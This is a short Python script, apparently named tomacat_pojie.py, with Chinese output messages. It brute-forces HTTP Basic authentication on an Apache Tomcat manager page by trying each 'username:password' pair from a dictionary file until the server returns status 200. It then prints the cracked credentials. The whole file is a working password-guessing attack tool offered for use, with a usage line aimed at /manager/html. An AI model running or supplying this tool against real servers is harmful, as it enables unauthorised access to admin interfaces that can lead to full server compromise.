#coding=utf-8

import requests
import base64
import sys

def run(url,file):
    with open(file, "r") as f:
        while 1:
            passwd = f.readline()[:-1]
            if passwd == "":
                break
            Authorization = "Basic " + base64.b64encode(passwd.encode("utf-8")).decode("utf-8")
            headers = {
                "Authorization": Authorization
            }
            response = requests.get(url, headers=headers)
            if response.status_code == 200:
                print("破解成功!")
                print("用户名:密码" + passwd)
                break
            else:
                print(str(response.status_code)+"破解失败，正在继续努力...")

if __name__ == '__main__':
    if len(sys.argv)>3:
        print('使用: python3 tomacat_pojie.py [地址] [字典]')
        print('用例: python3 tomacat_pojie.py http://127.0.0.1:8080/manager/html  dict.txt')
        print("字典格式：用户名:密码"+"例：admin:admin")
    else:
        url = sys.argv[1]
        file = sys.argv[2]
        run(url,file)
